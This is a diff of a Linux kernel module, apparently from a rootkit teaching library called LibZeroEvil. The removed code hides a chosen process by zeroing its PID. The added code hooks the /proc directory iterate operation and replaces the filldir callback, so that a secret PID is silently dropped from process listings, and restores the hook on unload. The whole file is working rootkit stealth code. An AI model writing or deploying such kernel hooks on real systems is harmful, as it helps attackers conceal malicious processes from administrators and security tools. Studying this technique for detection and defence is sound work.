@@ -1,40 +1,99 @@
-#include <linux/init.h>
+// Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>
+//
+// This file is part of LibZeroEvil.
+//
+// LibZeroEvil is free software:
+// you can redistribute it and/or modify it
+// under the terms of the GNU General Public License
+// as published by the Free Software Foundation,
+// either version 3 of the License,
+// or (at your option) any later version.
+//
+// LibZeroEvil is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License
+// along with LibZeroEvil.
+// If not, see <http://www.gnu.org/licenses/>.
+
+#ifndef CPP
 #include <linux/kernel.h>
-#include <linux/list.h>
 #include <linux/module.h>
-#include <linux/sched.h>
+// filp_open, filp_close, struct file, struct dir_context.
+#include <linux/fs.h>
+#endif  // CPP
+
+#include "zeroevil/zeroevil.h"
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("JASON.LIN.YU");
 
-static pid_t pid = 2237;
-static pid_t old_pid = 0;
-static struct task_struct* task = NULL;
-// static struct task_struct *old_task = NULL;
-static char* mystring = NULL;
-module_param(pid, int, 0);
-module_param(mystring, charp, 0);
-MODULE_PARM_DESC(pid, "The pid to hide");
-MODULE_PARM_DESC(mystring, "The process's name");
+#define ROOT_PATH "/proc"
+#define SECRET_PROC 1
 
-int start_module(void) {
-    task = pid_task(find_vpid(pid), PIDTYPE_PID);
-    if (NULL == task) {
-        return 1;
+int (*real_iterate)(struct file* filp, struct dir_context* ctx);
+int (*real_filldir)(struct dir_context* ctx,
+                    const char* name,
+                    int namlen,
+                    loff_t offset,
+                    u64 ino,
+                    unsigned d_type);
+
+int fake_iterate(struct file* filp, struct dir_context* ctx);
+int fake_filldir(struct dir_context* ctx,
+                 const char* name,
+                 int namlen,
+                 loff_t offset,
+                 u64 ino,
+                 unsigned d_type);
+
+int init_module(void) {
+    fm_alert("%s\n", "Greetings the World!");
+
+    set_file_op(iterate, ROOT_PATH, fake_iterate, real_iterate);
+
+    if (!real_iterate) {
+        return -ENOENT;
     }
-    old_pid = task->pid;
-    task->pid = 0;  //关键在于改变pid=0
+
     return 0;
 }
 
-void clean_module(void) {
-    struct list_head* list;
-    list_for_each(list, &current->tasks) {
-        task = list_entry(list, struct task_struct, tasks);
-        if (0 == memcmp(mystring, task->comm, strlen(mystring) + 1)) {
-            task->pid = old_pid;  //替换pid
-            break;
-        }
+void cleanup_module(void) {
+    if (real_iterate) {
+        void* dummy;
+        set_file_op(iterate, ROOT_PATH, real_iterate, dummy);
     }
+
+    fm_alert("%s\n", "Farewell the World!");
     return;
+}
+
+int fake_iterate(struct file* filp, struct dir_context* ctx) {
+    real_filldir = ctx->actor;
+    *(filldir_t*)&ctx->actor = fake_filldir;
+
+    return real_iterate(filp, ctx);
+}
+
+int fake_filldir(struct dir_context* ctx,
+                 const char* name,
+                 int namlen,
+                 loff_t offset,
+                 u64 ino,
+                 unsigned d_type) {
+    char* endp;
+    long pid;
+
+    pid = simple_strtol(name, &endp, 10);
+
+    if (pid == SECRET_PROC) {
+        fm_alert("Hiding pid: %ld", pid);
+        return 0;
+    }
+
+    /* pr_cont("%s ", name); */
+
+    return real_filldir(ctx, name, namlen, offset, ino, d_type);
 }
